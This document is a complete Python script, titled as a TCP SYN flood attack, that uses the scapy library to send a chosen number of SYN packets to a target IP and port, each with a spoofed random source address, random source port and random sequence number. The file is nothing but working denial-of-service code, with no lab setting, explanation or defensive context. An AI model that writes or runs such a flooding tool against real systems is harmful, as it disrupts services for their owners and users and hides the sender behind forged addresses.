# TCP SYN flood attack

from random import randint
from sys import stdout

from scapy.all import *
from scapy.layers.inet import IP, TCP


# Generate a random IP address
def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
    return ip


# Get a random integer
def randInt():
    x = randint(1000, 9000)
    return x


# Attack process
def tcp_syn_flood_attack(dstIP, dstPort, num_requests):
    total = 0
    print("Sending packets ......")

    # The process of generating and sending packet
    for x in range(0, num_requests):
        s_port = randInt()  # source port
        s_eq = randInt()  # sequential number

        # Craft the IP packet
        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        # Craft the TCP packet
        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = int(dstPort)
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq

        # Send out the packet
        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1

    stdout.write("\nTotal packets sent: %i\n" % total)
